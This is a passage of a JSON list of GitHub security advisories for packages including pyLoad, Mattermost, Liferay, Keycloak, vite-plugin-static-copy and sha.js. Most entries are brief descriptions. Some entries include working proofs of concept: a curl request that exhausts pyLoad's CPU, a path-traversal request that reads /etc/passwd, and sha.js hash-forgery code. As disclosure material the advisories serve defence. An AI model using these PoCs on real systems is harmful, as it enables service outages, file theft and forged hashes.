    "updated_at": "2025-08-22T20:30:51Z"
  },
  {
    "ghsa_id": "GHSA-qpp6-f3qj-rggq",
    "cve_id": "CVE-2025-43752",
    "severity": "medium",
    "summary": "Liferay Portal's Unlimited File Upload Could Result in DoS",
    "description": "Liferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.4, 2024.Q4.0 through 2024.Q4.7, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.15 and 7.4 GA through update 92 allow users to upload an unlimited amount of files through the object entries attachment fields, the files are stored in the document_library allowing an attacker to cause a potential DDoS.",
    "package_name": "com.liferay.portal:release.portal.bom",
    "ecosystem": "maven",
    "vulnerable_version_range": ">= 7.4.0-ga1, <= 7.4.3.132-ga132",
    "first_patched_version": null,
    "published_at": "2025-08-22T03:30:24Z",
    "updated_at": "2025-08-22T16:51:06Z"
  },
  {
    "ghsa_id": "GHSA-r367-q549-pgr5",
    "cve_id": "CVE-2025-43753",
    "severity": "low",
    "summary": "Liferay Portal Reflected Cross-Site Scripting Vulnerability via Form Container",
    "description": "A reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.3.32 through 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.7, 2024.Q4.0 through 2024.Q4.7, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.1 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.16 and 7.4 update 32 through update 92 allows an remote authenticated user to inject JavaScript into the embedded message field from the form container.",
    "package_name": "com.liferay:com.liferay.layout.taglib",
    "ecosystem": "maven",
    "vulnerable_version_range": "< 16.1.32",
    "first_patched_version": "16.1.32",
    "published_at": "2025-08-22T00:30:31Z",
    "updated_at": "2025-08-22T16:51:16Z"
  },
  {
    "ghsa_id": "GHSA-48cg-9c55-j2q7",
    "cve_id": "CVE-2025-51606",
    "severity": "high",
    "summary": "hippo4j Includes Hard Coded Secret Key in JWT Creation",
    "description": "hippo4j 1.0.0 to 1.5.0, uses a hard-coded secret key in its JWT (JSON Web Token) creation. This allows attackers with access to the source code or compiled binary to forge valid access tokens and impersonate any user, including privileged ones such as \"admin\". The vulnerability poses a critical security risk in systems where authentication and authorization rely on the integrity of JWTs.",
    "package_name": "cn.hippo4j:hippo4j-core",
    "ecosystem": "maven",
    "vulnerable_version_range": ">= 1.0.0, <= 1.5.0",
    "first_patched_version": null,
    "published_at": "2025-08-21T21:32:08Z",
    "updated_at": "2025-08-22T20:30:16Z"
  },
  {
    "ghsa_id": "GHSA-9gjj-6gj7-c4wj",
    "cve_id": "CVE-2025-57751",
    "severity": "high",
    "summary": "Denial-of-Service attack in pyLoad CNL Blueprint using dukpy.evaljs",
    "description": "Dear Maintainers,\nI am writing to you on behalf of the Tencent AI Sec. We have identified a potential vulnerability in one of your products and would like to report it to you for further investigation and mitigation.\n\n### Summary\nThe `jk` parameter is received in pyLoad CNL Blueprint. Due to the lack of `jk` parameter verification, the `jk` parameter input by the user is directly determined as dykpy.evaljs(), resulting in the server CPU being fully occupied and the web-ui becoming unresponsive.\n\n### Details\n- Endpoint: flash/addcrypted2\n- affected file: https://github.com/pyload/pyload/blob/develop/src/pyload/webui/app/blueprints/cnl_blueprint.py#L123\nhttps://github.com/pyload/pyload/blob/develop/src/pyload/core/utils/misc.py#L42\t\n\naffected code\n```python\n@bp.route(\"/flash/addcrypted2\", methods=[\"POST\"], endpoint=\"addcrypted2\")\n@local_check\ndef addcrypted2():\n    package = flask.request.form.get(\n        \"package\", flask.request.form.get(\"source\", flask.request.form.get(\"referer\"))\n    )\n    crypted = flask.request.form[\"crypted\"]\n    jk = flask.request.form[\"jk\"]\n    pack_password = flask.request.form.get(\"passwords\")\n\n    crypted = standard_b64decode(unquote(crypted.replace(\" \", \"+\")))\n    jk = eval_js(f\"{jk} f()\")\n\n```\n\n```python\ndef eval_js(script, es6=False):\n    if sys.version_info < (3, 12):\n        return (js2py.eval_js6 if es6 else js2py.eval_js)(script)\n    else:\n        return dukpy.evaljs(script)\n```\n\n### PoC\ndownload pyload and run locally, send the following request\n- PoC\n```shell\ncurl -X POST \"http://localhost:8000/flash/addcrypted2\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded\" \\\n  -d \"crypted=SGVsbG8gd29ybGQ=\" \\\n  -d \"passwords=pyload\" \\\n  -d \"jk=const start = Date.now();%0Awhile (Date.now() - start < 30_000) {} //\"\n```\nThe 30_000 can be modified to any large value.\n\n\n### Impact\nSystem resources are exhausted, causing services to be temporarily interrupted or stopped, making them inaccessible to normal users.\n\nUse the following command to check CPU usage\n```shell\ntop -pid $(pgrep -f \"pyload.__main__\") \n```\nor\n```shell\ntop -pid $(pgrep -f \"pyload\") \n```\n\nThe CPU is fully occupied\n<img width=\"1209\" height=\"134\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5f9338fe-90c8-4e99-bd8e-a5b5c5a81a6e\" />\n\nweb-ui unresponsive\n<img width=\"1209\" height=\"496\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7100cdb6-e4d5-4d0c-a138-51b08a7b1fbd\" />",
    "package_name": "pyload-ng",
    "ecosystem": "pip",
    "vulnerable_version_range": "< 0.5.0b3.dev92",
    "first_patched_version": "0.5.0b3.dev92",
    "published_at": "2025-08-21T20:11:52Z",
    "updated_at": "2025-08-22T15:01:50Z"
  },
  {
    "ghsa_id": "GHSA-pj6f-rc94-gw53",
    "cve_id": "CVE-2025-6465",
    "severity": "medium",
    "summary": "Mattermost Fails to Sanitize File Names",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to sanitize file names which allows users with file upload permission to overwrite file attachment thumbnails via path traversal in file streaming APIs.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.8.0, <= 10.8.3",
    "first_patched_version": "10.8.4",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:58:53Z"
  },
  {
    "ghsa_id": "GHSA-pj6f-rc94-gw53",
    "cve_id": "CVE-2025-6465",
    "severity": "medium",
    "summary": "Mattermost Fails to Sanitize File Names",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to sanitize file names which allows users with file upload permission to overwrite file attachment thumbnails via path traversal in file streaming APIs.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.5.0, <= 10.5.8",
    "first_patched_version": "10.5.9",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:58:53Z"
  },
  {
    "ghsa_id": "GHSA-pj6f-rc94-gw53",
    "cve_id": "CVE-2025-6465",
    "severity": "medium",
    "summary": "Mattermost Fails to Sanitize File Names",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to sanitize file names which allows users with file upload permission to overwrite file attachment thumbnails via path traversal in file streaming APIs.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.9.0, <= 10.9.3",
    "first_patched_version": "10.9.4",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:58:53Z"
  },
  {
    "ghsa_id": "GHSA-pj6f-rc94-gw53",
    "cve_id": "CVE-2025-6465",
    "severity": "medium",
    "summary": "Mattermost Fails to Sanitize File Names",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to sanitize file names which allows users with file upload permission to overwrite file attachment thumbnails via path traversal in file streaming APIs.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": "= 10.10.0",
    "first_patched_version": "10.10.1",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:58:53Z"
  },
  {
    "ghsa_id": "GHSA-pj6f-rc94-gw53",
    "cve_id": "CVE-2025-6465",
    "severity": "medium",
    "summary": "Mattermost Fails to Sanitize File Names",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to sanitize file names which allows users with file upload permission to overwrite file attachment thumbnails via path traversal in file streaming APIs.",
    "package_name": "github.com/mattermost/mattermost/server/v8",
    "ecosystem": "go",
    "vulnerable_version_range": "< 8.0.0-20250708173752-d6b35c41f0ae5",
    "first_patched_version": "8.0.0-20250708173752-d6b35c41f0ae5",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:58:53Z"
  },
  {
    "ghsa_id": "GHSA-x7p4-v8mj-6fxx",
    "cve_id": "CVE-2025-43754",
    "severity": "medium",
    "summary": "Liferay Portal Username Enumeration Vulnerability",
    "description": "Username enumeration vulnerability in Liferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2024.Q4.0 through 2024.Q4.7, 2024.Q3.0 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.14 and 7.4 GA through update 92 allows attackers to determine if an account exist in the application by inspecting the server processing time of the login request.",
    "package_name": "com.liferay.portal:release.portal.bom",
    "ecosystem": "maven",
    "vulnerable_version_range": ">= 7.4.0-ga1, <= 7.4.3.132-ga132",
    "first_patched_version": null,
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T16:51:27Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.8.0, <= 10.8.3",
    "first_patched_version": "10.8.4",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.5.0, <= 10.5.8",
    "first_patched_version": "10.5.9",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 10.9.0, <= 10.9.3",
    "first_patched_version": "10.9.4",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": "= 10.10.0",
    "first_patched_version": "10.10.1",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost/server/v8",
    "ecosystem": "go",
    "vulnerable_version_range": "< 8.0.0-20250708173752-d6b35c41f0ae5",
    "first_patched_version": "8.0.0-20250708173752-d6b35c41f0ae5",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-h469-4fcf-p23h",
    "cve_id": "CVE-2025-8402",
    "severity": "medium",
    "summary": "Mattermost has Potential Server Crash due to Unvalidated Import Data",
    "description": "Mattermost versions 10.8.x <= 10.8.3, 10.5.x <= 10.5.8, 9.11.x <= 9.11.17, 10.10.x <= 10.10.0, 10.9.x <= 10.9.3 fail to validate import data which allows a system admin to crash the server via the bulk import feature.",
    "package_name": "github.com/mattermost/mattermost-server",
    "ecosystem": "go",
    "vulnerable_version_range": ">= 9.11.0, <= 9.11.17",
    "first_patched_version": "9.11.18",
    "published_at": "2025-08-21T18:31:29Z",
    "updated_at": "2025-08-22T17:34:37Z"
  },
  {
    "ghsa_id": "GHSA-58cq-8wm2-6m87",
    "cve_id": "CVE-2025-43755",
    "severity": "medium",
    "summary": "Liferay Portal Stored Cross-Site Scripting Vulnerability via GroupPagesPortlet_type Parameter",
    "description": "A Stored cross-site scripting vulnerability in the Liferay Portal 7.4.0 t through 7.4.3.132, and Liferay DXP 2025.Q2.0, 2025.Q1.0 through 2025.Q1.13, 2024.Q4.0 through 2024.Q4.7, 2024.Q3.0 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.17 and 7.4 GA through update 92 allows an remote authenticated attacker to inject JavaScript into the _com_liferay_layout_admin_web_portlet_GroupPagesPortlet_type parameter.",
    "package_name": "com.liferay:com.liferay.layout.admin.web",
    "ecosystem": "maven",
    "vulnerable_version_range": "< 5.0.191",
    "first_patched_version": "5.0.191",
    "published_at": "2025-08-21T18:31:28Z",
    "updated_at": "2025-08-22T16:54:03Z"
  },
  {
    "ghsa_id": "GHSA-q2gv-w583-f2vq",
    "cve_id": "CVE-2025-43756",
    "severity": "medium",
    "summary": "Liferay Portal Reflected Cross-Site Scripting Vulnerability via snippet Parameter",
    "description": "A reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.15, 2025.Q2.0 through 2025.Q2.2 and 2024.Q1.13 through 2024.Q1.19 allows a remote authenticated user to inject JavaScript code via snippet parameter.",
    "package_name": "com.liferay.portal:release.portal.bom",
    "ecosystem": "maven",
    "vulnerable_version_range": "= 7.4.3.132-ga132",
    "first_patched_version": null,
    "published_at": "2025-08-21T18:31:28Z",
    "updated_at": "2025-08-22T16:53:52Z"
  },
  {
    "ghsa_id": "GHSA-w2wj-hw98-233h",
    "cve_id": "CVE-2025-9162",
    "severity": "medium",
    "summary": "Keycloak Potential Variable Reference in Model Storage Services",
    "description": "A flaw was found in org.keycloak/keycloak-model-storage-service. The KeycloakRealmImport custom resource substitutes placeholders within imported realm documents, potentially referencing environment variables. This substitution process\nallows for injection attacks when crafted realm documents are processed. An attacker can leverage this to inject malicious content during the realm import procedure. This can lead to unintended consequences within the Keycloak environment.",
    "package_name": "org.keycloak:keycloak-model-storage-services",
    "ecosystem": "maven",
    "vulnerable_version_range": "<= 26.3.3",
    "first_patched_version": null,
    "published_at": "2025-08-21T18:31:27Z",
    "updated_at": "2025-08-22T15:34:51Z"
  },
  {
    "ghsa_id": "GHSA-8hmm-4crw-vm2c",
    "cve_id": "CVE-2025-57755",
    "severity": "high",
    "summary": "@musistudio/claude-code-router has improper CORS configuration",
    "description": "### Impact\nDue to improper Cross-Origin Resource Sharing (CORS) configuration, there is a risk that user API Keys or equivalent credentials may be exposed to untrusted domains. Attackers could exploit this misconfiguration to steal credentials, abuse accounts, exhaust quotas, or access sensitive data.\n\n### Patches\nThe issue has been patched in v1.0.34.",
    "package_name": "@musistudio/claude-code-router",
    "ecosystem": "npm",
    "vulnerable_version_range": "< 1.0.34",
    "first_patched_version": "1.0.34",
    "published_at": "2025-08-21T14:54:24Z",
    "updated_at": "2025-08-21T19:17:35Z"
  },
  {
    "ghsa_id": "GHSA-pp7p-q8fx-2968",
    "cve_id": "CVE-2025-57753",
    "severity": "medium",
    "summary": "vite-plugin-static-copy files not included in `src` are possible to access with a crafted request",
    "description": "### Summary\n\nFiles not included in `src` was possible to access with a crafted request.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\nArbitrary files can be disclosed by exploiting this vulnerability.\n\n### Details\n\nConsider the following configuration in used by `vite.config.ts`:\n\n```ts\nimport { defineConfig } from 'vite'\nimport { viteStaticCopy } from 'vite-plugin-static-copy'\n\nexport default defineConfig({\n    plugins: [\n      viteStaticCopy({\n        targets: [\n          {\n            src: \"./public/images\",\n            dest: \"./\",\n          },\n        ],\n      }),\n    ],\n  });\n```\n\nThe files under the `./public/images` is only expected to be served. Abusing this vulnerability, an attacker can access arbitrary files on the filesystem.\n\n### PoC\nI've attached a demo app to showcase the bug.\n\nRun it with `npm run dev` and issue the following HTTP request\n\n```\nGET /static/images/../../../../../../../etc/passwd HTTP/1.1\nHost: localhost:3001\nContent-Length: 2\n```\nOR \n```\ncurl --path-as-is -i -s -k -X $'GET' \\\n    -H $'Host: localhost:3001' -H $'Content-Length: 2' \\\n    --data-binary $'\\x0d\\x0a' \\\n    $'http://localhost:3001/static/images/../../../../../../../etc/passwd'\n```\nObserve that the `/etc/passwd` file is included in the response.\n\n<img width=\"1289\" height=\"449\" alt=\"Screenshot 2025-08-16 at 10 27 11\u202fPM\" src=\"https://github.com/user-attachments/assets/4de12612-7b86-44d7-a403-c76f12832e37\" />",
    "package_name": "vite-plugin-static-copy",
    "ecosystem": "npm",
    "vulnerable_version_range": ">= 3.0.0, <= 3.1.1",
    "first_patched_version": "3.1.2",
    "published_at": "2025-08-21T14:53:52Z",
    "updated_at": "2025-08-21T19:17:00Z"
  },
  {
    "ghsa_id": "GHSA-pp7p-q8fx-2968",
    "cve_id": "CVE-2025-57753",
    "severity": "medium",
    "summary": "vite-plugin-static-copy files not included in `src` are possible to access with a crafted request",
    "description": "### Summary\n\nFiles not included in `src` was possible to access with a crafted request.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\nArbitrary files can be disclosed by exploiting this vulnerability.\n\n### Details\n\nConsider the following configuration in used by `vite.config.ts`:\n\n```ts\nimport { defineConfig } from 'vite'\nimport { viteStaticCopy } from 'vite-plugin-static-copy'\n\nexport default defineConfig({\n    plugins: [\n      viteStaticCopy({\n        targets: [\n          {\n            src: \"./public/images\",\n            dest: \"./\",\n          },\n        ],\n      }),\n    ],\n  });\n```\n\nThe files under the `./public/images` is only expected to be served. Abusing this vulnerability, an attacker can access arbitrary files on the filesystem.\n\n### PoC\nI've attached a demo app to showcase the bug.\n\nRun it with `npm run dev` and issue the following HTTP request\n\n```\nGET /static/images/../../../../../../../etc/passwd HTTP/1.1\nHost: localhost:3001\nContent-Length: 2\n```\nOR \n```\ncurl --path-as-is -i -s -k -X $'GET' \\\n    -H $'Host: localhost:3001' -H $'Content-Length: 2' \\\n    --data-binary $'\\x0d\\x0a' \\\n    $'http://localhost:3001/static/images/../../../../../../../etc/passwd'\n```\nObserve that the `/etc/passwd` file is included in the response.\n\n<img width=\"1289\" height=\"449\" alt=\"Screenshot 2025-08-16 at 10 27 11\u202fPM\" src=\"https://github.com/user-attachments/assets/4de12612-7b86-44d7-a403-c76f12832e37\" />",
    "package_name": "vite-plugin-static-copy",
    "ecosystem": "npm",
    "vulnerable_version_range": ">= 0.4.3, <= 2.3.1",
    "first_patched_version": "2.3.2",
    "published_at": "2025-08-21T14:53:52Z",
    "updated_at": "2025-08-21T19:17:00Z"
  },
  {
    "ghsa_id": "GHSA-95m3-7q98-8xr5",
    "cve_id": "CVE-2025-9288",
    "severity": "critical",
    "summary": "sha.js is missing type checks leading to hash rewind and passing on crafted data",
    "description": "### Summary\n\nThis is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.\n\nMissing input type checks lead to it calculating invalid values, hanging, rewinding the hash state (including turning a tagged hash into an untagged hash) on malicious JSON-stringifyable input\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst forgeHash = (data, payload) => JSON.stringify([payload, { length: -payload.length}, [...data]])\n\nconst sha = require('sha.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) => {\n  const hash = sha('sha256')\n  messages.forEach((m) => hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\nHashed input means safe\n```\n\nOr just:\n```console\n> require('sha.js')('sha256').update('foo').digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n> require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n```\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",
    "package_name": "sha.js",
    "ecosystem": "npm",
    "vulnerable_version_range": "<= 2.4.11",
    "first_patched_version": "2.4.12",
    "published_at": "2025-08-21T14:47:55Z",
    "updated_at": "2025-08-21T14:47:57Z"
  }
]